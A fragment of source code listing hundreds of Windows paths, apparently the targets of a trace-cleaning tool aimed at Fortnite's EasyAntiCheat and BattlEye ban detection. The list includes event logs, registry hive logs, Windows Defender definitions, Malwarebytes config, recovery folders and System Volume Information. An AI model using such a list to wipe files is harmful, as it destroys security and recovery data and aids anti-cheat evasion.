            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Operational.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Health.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\ProgramData\\NVIDIA",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Windows\\System32\\eac_usermode_21654663664752.dll",
            "C:\\Recovery",
            "C:\\Windows\\System32\\spp\\store\\2.0\\data.dat",
            "C:\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\EMS",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER\\ERC\\statecache.lock",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngineLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\CMS",
            "C:\\Program Files x86\\EasyAntiCheat",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{1b3f1407-39d0-4a4f-a547-cd4c65d17116}",
            "C:\\Windows\\System32\\WDI\\{533a67eb-9fb5-473d-b884-958cf4b9c4a3}\\{ed1e579f-1b61-4367-9430-f55c00c26870}",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader\\edb.chk",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader",
            "C:\\ProgramData\\Microsoft\\SmsRouter\\MessageStore",
            "C:\\Users\\All Users\\Malwarebytes\\MBAMService\\config",
            "C:\\Users\\All Users\\Microsoft\\Network\\Downloader",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC\\TokenBroker\\Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Grammars",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\Graph",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\signals\\collection\\WIFI",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState",
            "C:\\Windows\\bootstat.dat",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Windows\\Logs\\NetSetup\\service.0.etl",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\catroot2",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Backup Scan",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates",
            "C:\\ProgramData\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\S-1-5-21-2532382528-581214834-2534474248-1001\\SystemAppData\\Helium\\Cache",
            "C:\\Users\\All Users\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c",
            "C:\\Users\\Public\\ASR.dat",
            "C:\\Windows\\System32\\WDI",
            "C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Users\\caspue\\AppData\\Local\\Speech Graphics\\Carnival",
            "C:\\Users\\"+ user +"\\ntuser.ini",
            "C:\\System Volume Information",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Program Files\\Epic Games\\Fortnite\\.lysEB\\Install\\$resumeData",
            "C:\\Program Files x86\\Common Files\\BattlEye\\BEDaisy.sys",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\slideshow.ini",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Engine.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\D3DSCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\windows\\system32\\dllcache",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Tips",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\UnistoreDB\\USS.jtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\LMS",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\Settings\\roaming.lock",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\Settings\\settings.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\Settings\\settings.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\Settings\\roaming.lock",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\LocalCache",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\Program Files\\WindowsApps\\Microsoft.StorePurchaseApp_11811.1001.18.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.MicrosoftStickyNotes_3.6.73.0_x64__8wekyb3d8bbwe\\ActivationStore.dat.LOG1",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.MicrosoftStickyNotes_3.6.73.0_x64__8wekyb3d8bbwe\\ActivationStore.dat.LOG2",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG2",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\migration.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\migration.dat.LOG2",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache\\Local",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache\\Local\\Microsoft",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache\\Local\\Microsoft\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\AD2F1837.HPPrinterControl_v10z8vjag6ke6\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\AD2F1837.HPPrinterControl_v10z8vjag6ke6\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\AD2F1837.HPPrinterControl_v10z8vjag6ke6\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\AD2F1837.HPPrinterControl_v10z8vjag6ke6\\AC\\Temp",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\System32\\spp\\store\\2.0",
            "C:\\Windows\\System32\\spp\\store\\2.0\\data.dat",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19051.545.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VSApplicationInsights",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Caches",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\roaming.lock",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\D3DSCache",
            "C:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS",
            "C:\\ProgramData\\Epic\\UnrealEngineLauncher",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache",
            "C:\\ProgramData\\NVIDIA Corporation",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-AppxPackaging%4Operational.evtx",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Health.evtx\t",
            "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Storage-Storport%4Operational.evtx\t",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IECompatCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IECompatUaCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\Low",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\ProgramData\\Microsoft\\Network\\Downloader",
            "C:\\Windows\\Prefetch",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Spotify\\Browser\\GPUCache",
            "C:\\Windows\\System32\\wbem\\Logs\\wmiprov.log",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTTerminal-Services-LSM-ApplicationLag-9032.etl",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache",
            "C:\\Program Files x86\\Common Files\\BattlEye",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs",
            "C:\\ProgramData\\NVIDIA",
            "C:\\Windows\\System32\\config\\SOFTWARE.LOG1",
            "C:\\Windows\\WindowsUpdate.log",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\InputApp_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.LockApp_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.LockApp_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.LockApp_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\AC\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.WindowsStore_8wekyb3d8bbwe\\AC\\Temp\\NVIDIA Corporation\\NV_Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState\\Traces",
            "C:\\Windows\\System32\\wbem\\Performance",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\Windows\\AppReadiness",
            "C:\\ProgramData\\regid.1991-06.com.microsoft",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Windows\\ServiceProfiles\\LocalService\\ntuser.dat.log1",
            "C:\\Windows\\ServiceProfiles\\LocalService\\ntuser.dat.log2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\AC\\Temp",
